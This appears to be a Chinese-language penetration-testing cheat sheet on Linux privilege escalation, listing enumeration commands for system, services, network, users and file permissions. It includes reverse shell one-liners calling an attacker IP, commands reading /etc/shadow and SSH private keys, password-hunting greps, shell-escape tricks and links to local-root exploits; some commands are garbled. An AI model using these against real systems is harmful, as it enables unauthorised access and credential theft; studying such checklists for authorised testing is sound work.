---
title: "linux提权"
date: 2016-04-09 23:58
---

## 系统类型

### 系统版本?

```
cat /etc/issue
cat /etc/*-release
cat /etc/lsb-release
cat /etc/redhat-release
```

### 内核版本

```
cat /proc/version  
uname -a
uname -mrs
rpm -q kernel
dmesg | grep Linux
ls /boot | grep vmlinuz
```

### 环境变量

```
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
env
set
```

### 是否有台打印机？

```
lpstat -a
```

## 应用与服务

### 运行服务， 服务用户权限

```
ps aux
ps -ef
top
cat /etc/service
```

### 服务具有root的权限， 这些服务里你看起来那些有漏洞,进行再次检查

```
ps aux | grep root
ps -ef | grep root
```

### 安装了哪些应用程序？他们是什么版本？哪些是当前正在运行的？

```
ls -alh /usr/bin/
ls -alh /sbin/
dpkg -l
rpm -qa
ls -alh /var/cache/apt/archivesO
ls -alh /var/cache/yum/
```

### Service设置，有任何的错误配置吗？是否有任何（脆弱的）的插件？

```
cat /etc/syslog.conf
cat /etc/chttp.conf
cat /etc/lighttpd.conf
cat /etc/cups/cupsd.conf
cat /etc/inetd.conf
cat /etc/apache2/apache2.conf
cat /etc/my.conf
cat /etc/httpd/conf/httpd.conf
cat /opt/lampp/etc/httpd.conf
ls -aRl /etc/ | awk ‘$1 ~ /^.*r.*/
```

### 主机上有哪些工作计划？

```
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
```

### 主机上可能有哪些纯文本用户名和密码?

```
grep -i user [filename]
grep -i pass [filename]
grep -C 5 "password" [filename]
find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"   # Joomla
```

## 通信与网络

### NIC(s)，系统有哪些？它是连接到哪一个网络？

```
/sbin/ifconfig -a
cat /etc/network/interfaces
cat /etc/sysconfig/network
```

### 网络配置设置是什么？网络中有什么样的服务器？DHCP服务器？DNS服务器？网关？

```
cat /etc/resolv.conf
cat /etc/sysconfig/network
cat /etc/networks
iptables -L
hostname
dnsdomainname
```

### 其他用户主机与系统的通信？

```
lsof -i
lsof -i :80
grep 80 /etc/services
netstat -antup
netstat -antpx
netstat -tulpn
chkconfig --list
chkconfig --list | grep 3:on
last
w
```

### 缓存？IP和/或MAC地址?

```
arp -e
route
/sbin/route -nee
```

数据包可能嗅探吗？可以看出什么？监听流量

```
# tcpdump tcp dst [ip] [port] and tcp dst [ip] [port]
tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.2.2.222 21
```

### 你如何get一个shell？你如何与系统进行交互？

```
[1]:
# http://lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/

# Attacker. 输入 (命令)
nc -lvp 4444    
# Attacker. 输出(结果)
nc -lvp 4445    
# 在目标系统上. 使用 攻击者的IP!
telnet [attacker's ip] 44444 | /bin/sh | [local ip] 44445

[2]:
# Attacker 输入命令，输出结果
nc -lvp 4444  

# 目标系统
nc -e /bin/bash attacker_ip 4444
```

### 如何端口转发？（端口重定向）

```
# rinetd

# http://www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch
# fpipe

# FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP]
FPipe.exe -l 80 -r 80 -s 80 192.168.1.7
#ssh

# ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]
ssh -L 8080:127.0.0.1:80 root@192.168.1.7    # Local Port
ssh -R 8080:127.0.0.1:80 root@192.168.1.7    # Remote Port
#mknod

# mknod backpipe p ; nc -l -p [remote port] < backpipe  | nc [local IP] [local port] >backpipe
mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.1.1.251 80 >backpipe    # Port Relay
mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe    # Proxy (Port 80 to 8080)
mknod

backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc
localhost 80 | tee -a outflow & 1>backpipe    # Proxy monitor (Port 80 to 8080)
```

### 建立隧道可能吗？本地，远程发送命令

```
ssh -D 127.0.0.1:9050 -N [username]@[ip]
proxychains ifconfig
```

## 秘密信息和用户

### 你是谁？哪个id登录？谁已经登录？还有谁在这里？谁可以做什么呢？

```
id
who
w
last
cat /etc/passwd | cut -d:    # List of users
grep -v -E "^#" /etc/passwd | awk -F: &#039;$3 == 0 { print $1}'   # List of super users
awk -F: '($3 == "0") {print}&#039; /etc/passwd   # List of super users
cat /etc/sudoers
sudo -l
```

### 可以找到什么敏感文件？

```
cat /etc/passwd
cat /etc/group
cat /etc/shadow
ls -alh /var/mail/
```

### 什么有趣的文件在home/directorie（S）里？如果有权限访问

```
ls -ahlR /root/
ls -ahlR /home/
```

### 是否有任何密码，脚本，数据库，配置文件或日志文件？密码默认路径和位置

```
cat /var/apache2/config.inc
cat /var/lib/mysql/mysql/user.MYD
cat /root/anaconda-ks.cfg
```

### 用户做过什么？是否有任何密码呢？他们有没有编辑什么？

```
cat ~/.bash_history
cat ~/.nano_history
cat ~/.atftp_history
cat ~/.mysql_history
cat ~/.php_history
```

### 可以找到什么样的用户信息

```
cat ~/.bashrc
cat ~/.profile
cat /var/mail/root
cat /var/spool/mail/root
private-key 
```

### 信息能否被发现？

```
cat ~/.ssh/authorized_keys
cat ~/.ssh/identity.pub
cat ~/.ssh/identity
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa.pub
cat ~/.ssh/id_dsa
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_host_dsa_key.pub
cat /etc/ssh/ssh_host_dsa_key
cat /etc/ssh/ssh_host_rsa_key.pub
cat /etc/ssh/ssh_host_rsa_key
cat /etc/ssh/ssh_host_key.pub
cat /etc/ssh/ssh_host_key
```

## 文件系统

### 哪些用户可以写配置文件在/ etc /？能够重新配置服务？

```
ls -aRl /etc/ | awk ‘$1 ~ /^.*w.*/' 2>/dev/null     # Anyone
ls -aRl /etc/ | awk ’$1 ~ /^..w/' 2>/dev/null        # Owner
ls -aRl /etc/ | awk ‘$1 ~ /^.....w/' 2>/dev/null    # Group
ls -aRl /etc/ | awk ’;$1 ~ /w.$/' 2>/dev/null          # Other
find /etc/ -readable -type f 2>/dev/null                         # Anyone
find /etc/ -readable -type f -maxdepth 1 2>/dev/null   # Anyone
```

### 在/ var /有什么可以发现？

```
ls -alh /var/log
ls -alh /var/mail
ls -alh /var/spool
ls -alh /var/spool/lpd
ls -alh /var/lib/pgsql
ls -alh /var/lib/mysql
cat /var/lib/dhcp3/dhclient.leases
```

### 网站上的任何隐藏配置/文件?配置文件与数据库信息？

```
ls -alhR /var/www/
ls -alhR /srv/www/htdocs/
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/
ls -alhR /var/www/html/
```

### 有什么在日志文件里?（什么能够帮助到“本地文件包含”?)

```
# http://www.thegeekstuff.com/2011/08/linux-var-log-files/
cat /etc/httpd/logs/access_log
cat /etc/httpd/logs/access.log
cat /etc/httpd/logs/error_log
cat /etc/httpd/logs/error.log
cat /var/log/apache2/access_log
cat /var/log/apache2/access.log
cat /var/log/apache2/error_log
cat /var/log/apache2/error.log
cat /var/log/apache/access_log
cat /var/log/apache/access.log
cat /var/log/auth.log
cat /var/log/chttp.log
cat /var/log/cups/error_log
cat /var/log/dpkg.log
cat /var/log/faillog
cat /var/log/httpd/access_log
cat /var/log/httpd/access.log
cat /var/log/httpd/error_log
cat /var/log/httpd/error.log
cat /var/log/lastlog
cat /var/log/lighttpd/access.log
cat /var/log/lighttpd/error.log
cat /var/log/lighttpd/lighttpd.access.log
cat /var/log/lighttpd/lighttpd.error.log
cat /var/log/messages
cat /var/log/secure
cat /var/log/syslog
cat /var/log/wtmp
cat /var/log/xferlog
cat /var/log/yum.log
cat /var/run/utmp
cat /var/webmin/miniserv.log
cat /var/www/logs/access_log
cat /var/www/logs/access.log
ls -alh /var/lib/dhcp3/
ls -alh /var/log/postgresql/
ls -alh /var/log/proftpd/
ls -alh /var/log/samba/
#
auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info,

mail.log, mail.warn, messages, syslog, udev, wtmp(有什么文件?log.系统引导……)
```

### 如果命令限制，你可以打出哪些突破它的限制？

```
python -c 'import pty;pty.spawn("/bin/bash")'
echo os.system('/bin/bash')
/bin/sh -i
```

### 如何安装文件系统？

```
mount
df -h
```

### 是否有挂载的文件系统？

```
cat /etc/fstab
```

### 什么是高级Linux文件权限使用？Sticky bits, SUID 和GUID

```
find / -perm -1000 -type d 2>/dev/null    # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here
find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the  group, not the user who started it.
find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the  owner, not the user who started it.
find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
for i in `locate -r "bin$"`; do find $i ( -perm -4000 -o -perm -2000 ) -type f 2>/dev/null; done    #
Looks in &#039;common&#039; places: /bin, /sbin, /usr/bin, /usr/sbin,
/usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID
(Quicker search)
#
findstarting at root (/), SGIDorSUID, not Symbolic links, only 3
folders deep, list with more detail and hideany errors (e.g. permission
denied)
find/-perm -g=s-o-perm -4000! -type l-maxdepth 3 -exec ls -ld {} ;2>/dev/null
```

### 在哪些目录可以写入和执行呢？几个“共同”的目录：/ tmp目录，/var / tmp目录/ dev /shm目录

```
find / -writable -type d 2>/dev/null        # world-writeable folders
find / -perm -222 -type d 2>/dev/null      # world-writeable folders
find / -perm -o+w -type d 2>/dev/null    # world-writeable folders
find / -perm -o+x -type d 2>/dev/null    # world-executable folders
find / ( -perm -o+w -perm -o+x ) -type d 2>/dev/null   # world-writeable & executable folders
Any "problem" files？可写的的，“没有使用"的文件
find / -xdev -type d ( -perm -0002 -a ! -perm -1000 ) -print   # world-writeable files
find /dir -xdev ( -nouser -o -nogroup ) -print   # Noowner files
```

## 准备和查找漏洞利用代码

### 安装了什么开发工具/语言/支持？

```
find / -name perl*
find / -name python*
find / -name gcc*
find / -name cc
```

### 如何上传文件？

```
find / -name wget
find / -name nc*
find / -name netcat*
find / -name tftp*
find / -name ftp
```

### 查找exploit代码

http://www.exploit-db.com

http://1337day.com

http://www.securiteam.com

http://www.securityfocus.com

http://www.exploitsearch.net

http://metasploit.com/modules/

http://securityreason.com

http://seclists.org/fulldisclosure/

http://www.google.com

查找更多有关漏洞的信息

http://www.cvedetails.com

http://packetstormsecurity.org/files/cve/[CVE]

http://cve.mitre.org/cgi-bin/cvename.cgi?name=[CVE]]http://cve.mitre.org/cgi-bin/cvename.cgi?name=[CVE]

http://www.vulnview.com/cve-details.php?cvename=[CVE]]http://www.vulnview.com/cve-details.php?cvename=[CVE]

http://www.91ri.org/

(快速）“共同的“exploit,预编译二进制代码文件

http://tarantula.by.ru/localroot/

http://www.kecepatan.66ghz.com/file/local-root-exploit-priv9/

上面的信息很难吗？

快去使用第三方脚本/工具来试试吧！

### 系统怎么打内核，操作系统，所有应用程序，插件和Web服务的最新补丁？

```
apt-get update && apt-get upgrade
yum update
```

### 服务运行所需的最低的权限？

例如，你需要以root身份运行MySQL？

能够从以下网站找到自动运行的脚本？！

http://pentestmonkey.net/tools/unix-privesc-check/

http://labs.portcullis.co.uk/application/enum4linux/

http://bastille-linux.sourceforge.net

（快速）指南和链接

例如

http://www.0daysecurity.com/penetration-testing/enumeration.html

http://www.microloft.co.uk/hacking/hacking3.htm

其他

http://jon.oberheide.org/files/stackjacking-infiltrate11.pdf

http://pentest.cryptocity.net/files/clientsides/post_exploitation_fall09.pdf

http://insidetrust.blogspot.com/2011/04/quick-guide-to-linux-privilege.html